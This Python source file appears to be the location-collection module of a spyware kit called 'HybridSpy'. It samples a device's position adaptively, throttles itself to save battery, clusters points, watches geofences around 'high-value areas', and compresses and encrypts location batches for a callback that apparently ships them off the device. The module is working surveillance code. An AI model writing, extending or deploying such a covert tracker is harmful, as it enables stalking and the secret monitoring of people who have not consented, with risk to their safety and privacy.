import json
import logging
import math
import threading
import time
import zlib
from collections import defaultdict
from dataclasses import dataclass, field, asdict
from datetime import datetime, timezone
from enum import Enum
from typing import Callable, Dict, List, Optional, Set, Tuple

log = logging.getLogger("HybridSpy.Collectors.Location")


# ─── Constants ───────────────────────────────────────────────────────────────

EARTH_RADIUS_M = 6_371_000
LOCATION_CACHE_FILE = "location_cache.enc"
LOCATION_STATE_FILE = "location_state.json"
GEOFENCE_STATE_FILE = "geofence_state.json"

MIN_ACCURACY_M = 50.0       # Ignore locations worse than 50m
MIN_DISTANCE_M = 10.0       # Min distance to record new point
MAX_BATCH_SIZE = 25
DEFAULT_INTERVAL = 120       # seconds
FAST_INTERVAL = 15           # seconds when moving
STATIONARY_THRESHOLD_M = 5  # Consider stationary if within 5m
STATIONARY_TIMEOUT = 600     # seconds before throttling to slow interval
SLOW_INTERVAL = 600          # seconds when stationary


class LocationProvider(Enum):
    GPS = "gps"
    NETWORK = "network"
    PASSIVE = "passive"
    FUSED = "fused"


class LocationQuality(Enum):
    EXCELLENT = "excellent"    # <10m accuracy
    GOOD = "good"             # 10-25m
    FAIR = "fair"             # 25-50m
    POOR = "poor"             # >50m (filtered out)


@dataclass
class GeoPoint:
    """A geographic coordinate."""
    lat: float
    lng: float
    
    def distance_to(self, other: "GeoPoint") -> float:
        """Haversine distance in meters."""
        dlat = math.radians(other.lat - self.lat)
        dlng = math.radians(other.lng - self.lng)
        a = (math.sin(dlat / 2) ** 2 +
             math.cos(math.radians(self.lat)) *
             math.cos(math.radians(other.lat)) *
             math.sin(dlng / 2) ** 2)
        c = 2 * math.atan2(math.sqrt(a), math.sqrt(1 - a))
        return EARTH_RADIUS_M * c


@dataclass
class LocationSample:
    """A single location reading."""
    lat: float
    lng: float
    accuracy: float        # meters
    altitude: float = 0.0
    speed: float = 0.0     # m/s
    bearing: float = 0.0
    provider: str = "fused"
    timestamp: int = 0     # Unix timestamp milliseconds
    elapsed_ms: int = 0
    
    @property
    def quality(self) -> LocationQuality:
        if self.accuracy <= 10:
            return LocationQuality.EXCELLENT
        elif self.accuracy <= 25:
            return LocationQuality.GOOD
        elif self.accuracy <= 50:
            return LocationQuality.FAIR
        return LocationQuality.POOR
    
    @property
    def point(self) -> GeoPoint:
        return GeoPoint(self.lat, self.lng)
    
    @property
    def is_valid(self) -> bool:
        return (self.accuracy <= MIN_ACCURACY_M and
                -90 <= self.lat <= 90 and
                -180 <= self.lng <= 180)


@dataclass
class Geofence:
    """A circular geofence zone."""
    name: str
    lat: float
    lng: float
    radius_m: float
    trigger_on_entry: bool = True
    trigger_on_exit: bool = True
    triggered: bool = False
    last_trigger_time: Optional[float] = None
    cooldown: float = 3600  # Don't re-trigger within 1 hour


@dataclass
class LocationBatch:
    samples: List[LocationSample]
    batch_id: str
    created_at: float = field(default_factory=time.time)
    retry_count: int = 0
    ciphertext: Optional[bytes] = None


# ─── Location Collector ──────────────────────────────────────────────────────

class LocationCollector:
    """
    Elite-grade location collector with adaptive sampling.
    
    Core logic:
      - If moving (>5m from last point): sample every 15s
      - If stationary: throttle to every 10 minutes
      - Geofence triggers for high-value areas
      - Location clustering to deduplicate nearby points
      - Battery-aware: reduces GPS usage when stationary
    """
    
    def __init__(self, crypto_engine, storage_manager,
                 on_batch_ready: Optional[Callable[[LocationBatch], None]] = None,
                 config: Optional[Dict] = None):
        self._crypto = crypto_engine
        self._storage = storage_manager
        self._on_batch = on_batch_ready
        self._config = config or {}
        
        self._provider = None
        
        self._lock = threading.RLock()
        self._running = False
        self._thread: Optional[threading.Thread] = None
        
        # State tracking
        self._last_location: Optional[LocationSample] = None
        self._last_movement_time: float = time.time()
        self._current_interval: float = DEFAULT_INTERVAL
        
        # Location history for clustering
        self._recent_locations: List[LocationSample] = []
        self._cluster_radius = self._config.get("cluster_radius", 25.0)
        
        # Geofences
        self._geofences: List[Geofence] = []
        self._geofence_events: List[Dict] = []
        
        # Batch buffer
        self._batch_buffer: List[LocationSample] = []
        self._last_flush = time.time()
        self._flush_interval = self._config.get("flush_interval", 300)
        
        # Battery awareness
        self._battery_level: float = 100.0
        self._is_charging: bool = True
        self._battey_check_interval = 60
        
        # Stats
        self._stats = {
            "total_samples": 0,
            "total_batches": 0,
            "geofence_triggers": 0,
            "cluster_merges": 0,
            "low_accuracy_discarded": 0,
            "failures": 0,
            "last_location": None,
        }
        
        self._load_state()
        self._load_geofences()
    
    # ─── Lifecycle ──────────────────────────────────────────────────────
    
    def start(self, provider):
        with self._lock:
            if self._running:
                return
            self._provider = provider
            self._running = True
            self._thread = threading.Thread(target=self._collection_loop,
                                            daemon=True, name="location-collector")
            self._thread.start()
            log.info("Location collector started")
    
    def stop(self, timeout: float = 5.0):
        with self._lock:
            self._running = False
        if self._thread and self._thread.is_alive():
            self._thread.join(timeout=timeout)
        self._flush_buffer(force=True)
        self._save_state()
        log.info("Location collector stopped")
    
    def force_sample(self) -> Optional[LocationSample]:
        """Force a single location sample."""
        return self._take_sample()
    
    # ─── Adaptive Collection Loop ───────────────────────────────────────
    
    def _collection_loop(self):
        while self._running:
            try:
                sample = self._take_sample()
                if sample:
                    self._process_sample(sample)
                    self._update_interval(sample)
                    self._check_geofences(sample)
                
                self._check_auto_flush()
                
            except PermissionError:
                log.warning("Location permission revoked")
                self._running = False
                break
            except Exception as e:
                log.error(f"Location error: {e}", exc_info=True)
                self._stats["failures"] += 1
            
            # Sleep with adaptive jitter
            jitter = self._current_interval * (0.8 + hash(str(time.time())) % 40 / 100)
            time.sleep(min(jitter, 600))
    
    def _take_sample(self) -> Optional[LocationSample]:
        """Take a single location sample from the best available provider."""
        if not self._provider:
            return None
        
        try:
            # Try fused/provider location via JNI bridge
            result = self._provider.call("getLastKnownLocation")
            if not result:
                return None
            
            sample = LocationSample(
                lat=result.get("latitude", 0.0),
                lng=result.get("longitude", 0.0),
                accuracy=result.get("accuracy", 999.0),
                altitude=result.get("altitude", 0.0),
                speed=result.get("speed", 0.0),
                bearing=result.get("bearing", 0.0),
                provider=result.get("provider", "fused"),
                timestamp=result.get("time", int(time.time() * 1000)),
                elapsed_ms=result.get("elapsedRealtime", 0),
            )
            
            if not sample.is_valid:
                self._stats["low_accuracy_discarded"] += 1
                return None
            
            return sample
            
        except Exception as e:
            log.error(f"Failed to get location: {e}")
            return None
    
    def _process_sample(self, sample: LocationSample):
        """Process a sample through dedup and clustering."""
        # Check if we already have a nearby sample (clustering)
        if self._is_clustered(sample):
            self._stats["cluster_merges"] += 1
            return
        
        # Check minimum distance from last recorded point
        if self._last_location:
            dist = self._last_location.point.distance_to(sample.point)
            if dist < MIN_DISTANCE_M and sample.accuracy > 20:
                # Too close and not very accurate — skip
                return
        
        with self._lock:
            self._batch_buffer.append(sample)
            self._recent_locations.append(sample)
            self._last_location = sample
            self._stats["total_samples"] += 1
            self._stats["last_location"] = f"{sample.lat},{sample.lng}"
            
            # Prune recent locations buffer
            cutoff = time.time() - 3600
            self._recent_locations = [
                s for s in self._recent_locations
                if s.timestamp / 1000 > cutoff
            ]
            
            if len(self._batch_buffer) >= MAX_BATCH_SIZE:
                self._flush_buffer()
    
    def _is_clustered(self, sample: LocationSample) -> bool:
        """Check if sample is within cluster radius of recent points."""
        for recent in self._recent_locations[-10:]:
            dist = recent.point.distance_to(sample.point)
            if dist < self._cluster_radius:
                return True
        return False
    
    def _update_interval(self, sample: LocationSample):
        """Adapt sampling interval based on movement."""
        if not self._last_location:
            self._current_interval = FAST_INTERVAL
            return
        
        dist = self._last_location.point.distance_to(sample.point)
        speed = sample.speed
        
        if speed > 2.0 or dist > STATIONARY_THRESHOLD_M:
            # Moving
            self._current_interval = FAST_INTERVAL
            self._last_movement_time = time.time()
        else:
            # Stationary — check how long
            stationary_time = time.time() - self._last_movement_time
            if stationary_time > STATIONARY_TIMEOUT:
                self._current_interval = SLOW_INTERVAL
            else:
                self._current_interval = DEFAULT_INTERVAL
        
        # Battery-aware adjustment
        if self._battery_level < 15 and not self._is_charging:
            self._current_interval = min(self._current_interval * 3, SLOW_INTERVAL)
    
    # ─── Geofences ──────────────────────────────────────────────────────
    
    def add_geofence(self, name: str, lat: float, lng: float,
                     radius_m: float = 100.0) -> Geofence:
        """Add a geofence zone."""
        gf = Geofence(
            name=name,
            lat=lat,
            lng=lng,
            radius_m=radius_m,
        )
        with self._lock:
            self._geofences.append(gf)
            self._save_geofences()
        log.info(f"Added geofence: {name} ({lat},{lng}) r={radius_m}m")
        return gf
    
    def remove_geofence(self, name: str) -> bool:
        """Remove a geofence by name."""
        with self._lock:
            before = len(self._geofences)
            self._geofences = [g for g in self._geofences if g.name != name]
            if len(self._geofences) < before:
                self._save_geofences()
                return True
        return False
    
    def _check_geofences(self, sample: LocationSample):
        """Check all geofences against current location."""
        now = time.time()
        for gf in self._geofences:
            dist = GeoPoint(sample.lat, sample.lng).distance_to(
                GeoPoint(gf.lat, gf.lng)
            )
            inside = dist <= gf.radius_m
            
            if inside and gf.trigger_on_entry and not gf.triggered:
                if not gf.last_trigger_time or (now - gf.last_trigger_time) > gf.cooldown:
                    gf.triggered = True
                    gf.last_trigger_time = now
                    event = {
                        "type": "geofence_entry",
                        "fence": gf.name,
                        "lat": sample.lat,
                        "lng": sample.lng,
                        "distance_m": round(dist, 1),
                        "timestamp": datetime.utcnow().isoformat(),
                    }
                    self._geofence_events.append(event)
                    self._stats["geofence_triggers"] += 1
                    log.info(f"Geofence ENTRY: {gf.name}")
                    
            elif not inside and gf.trigger_on_exit and gf.triggered:
                if not gf.last_trigger_time or (now - gf.last_trigger_time) > gf.cooldown:
                    gf.triggered = False
                    gf.last_trigger_time = now
                    event = {
                        "type": "geofence_exit",
                        "fence": gf.name,
                        "lat": sample.lat,
                        "lng": sample.lng,
                        "distance_m": round(dist, 1),
                        "timestamp": datetime.utcnow().isoformat(),
                    }
                    self._geofence_events.append(event)
                    log.info(f"Geofence EXIT: {gf.name}")
    
    # ─── Buffer Flushing ────────────────────────────────────────────────
    
    def _check_auto_flush(self):
        now = time.time()
        if len(self._batch_buffer) >= MAX_BATCH_SIZE or \
           (now - self._last_flush) >= self._flush_interval:
            self._flush_buffer()
    
    def _flush_buffer(self, force: bool = False):
        with self._lock:
            if not self._batch_buffer and not force:
                return
            if not self._batch_buffer:
                return
            
            batch = LocationBatch(
                samples=list(self._batch_buffer),
                batch_id=f"loc_{int(time.time() * 1000)}_{len(self._batch_buffer)}",
                created_at=time.time(),
            )
            self._batch_buffer.clear()
            self._last_flush = time.time()
        
        # Include geofence events
        geofence_events = list(self._geofence_events)
        self._geofence_events.clear()
        
        try:
            batch_dict = {
                "samples": [asdict(s) for s in batch.samples],
                "geofence_events": geofence_events,
            }
            serialized = json.dumps(batch_dict, default=str).encode("utf-8")
            compressed = zlib.compress(serialized, level=6)
            batch.ciphertext = self._crypto.encrypt(compressed)
        except Exception as e:
            log.error(f"Encryption failed: {e}")
        
        self._store_batch_locally(batch)
        
        if self._on_batch:
            try:
                self._on_batch(batch)
            except Exception as e:
                log.error(f"Batch callback error: {e}")
        
        self._stats["total_batches"] += 1
    
    def _store_batch_locally(self, batch: LocationBatch):
        try:
            cache_path = self._storage.get_path(LOCATION_CACHE_FILE)
            if not cache_path:
                return
            batch_data = {
                "id": batch.batch_id,
                "timestamp": batch.created_at,
                "count": len(batch.samples),
                "ciphertext": batch.ciphertext.hex() if batch.ciphertext else None,
                "retries": batch.retry_count,
            }
            self._storage.append_to_list(cache_path, batch_data)
        except Exception as e:
            log.error(f"Local storage failed: {e}")
    
    # ─── State ──────────────────────────────────────────────────────────
    
    def _load_state(self):
        try:
            state = self._storage.read_dict(LOCATION_STATE_FILE)
            if state:
                self._current_interval = state.get("interval", DEFAULT_INTERVAL)
                self._stats = state.get("stats", self._stats)
                last = state.get("last_location")
                if last:
                    self._last_location = LocationSample(**last)
        except Exception:
            pass
    
    def _save_state(self):
        try:
            state = {
                "interval": self._current_interval,
                "stats": self._stats,
                "last_location": asdict(self._last_location) if self._last_location else None,
                "updated_at": datetime.utcnow().isoformat(),
            }
            self._storage.write_dict(LOCATION_STATE_FILE, state)
        except Exception as e:
            log.error(f"State save failed: {e}")
    
    def _load_geofences(self):
        try:
            data = self._storage.read_dict(GEOFENCE_STATE_FILE)
            if data and "geofences" in data:
                self._geofences = [Geofence(**g) for g in data["geofences"]]
        except Exception:
            pass
    
    def _save_geofences(self):
        try:
            self._storage.write_dict(GEOFENCE_STATE_FILE, {
                "geofences": [asdict(g) for g in self._geofences],
            })
        except Exception as e:
            log.error(f"Geofence save failed: {e}")
    
    # ─── Public API ─────────────────────────────────────────────────────
    
    def get_stats(self) -> Dict:
        return dict(self._stats)
    
    def get_health(self) -> Dict:
        return {
            "running": self._running,
            "current_interval": self._current_interval,
            "buffer_size": len(self._batch_buffer),
            "last_location": f"{self._last_location.lat},{self._last_location.lng}" if self._last_location else None,
            "geofences": len(self._geofences),
            "battery_level": self._battery_level,
            "is_charging": self._is_charging,
            "stats": self.get_stats(),
        }
    
    def set_battery_state(self, level: float, is_charging: bool):
        """Update battery state for adaptive sampling."""
        self._battery_level = level
        self._is_charging = is_charging
    
    def reset_state(self):
        with self._lock:
            self._last_location = None
            self._batch_buffer.clear()
            self._recent_locations.clear()
            self._current_interval = DEFAULT_INTERVAL
            self._stats = {k: 0 for k in self._stats}
            self._save_state()
        log.info("Location collector state reset")
